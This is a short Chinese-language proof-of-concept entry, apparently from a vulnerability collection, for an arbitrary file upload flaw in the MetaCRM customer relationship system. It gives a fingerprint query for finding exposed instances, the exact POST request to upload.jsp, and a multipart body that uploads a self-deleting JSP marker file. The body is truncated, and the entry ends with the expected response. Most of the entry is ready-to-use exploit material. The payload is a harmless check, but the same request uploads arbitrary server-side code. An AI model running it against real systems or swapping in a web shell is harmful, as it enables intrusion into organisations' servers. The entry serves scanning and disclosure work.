# MetaCRM客户关系管理系统upload任意文件上传漏洞

- **系统**：MetaCRM　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`product="美特软件-MetaCRM6"`
- **请求**：`POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0Mh3BfgW…`

**请求体 / payload**
```
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: text/plain
<% out.print("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="key"
null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="form"
null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="field"
null
------WebKitFormBoundary0Mh3BfgWszxRFokh
Content-Disposition: form-data; name="filetitil…（脚本共 746 字，完整版见原文）
```
- **预期**：200　|　dudesuite.jsp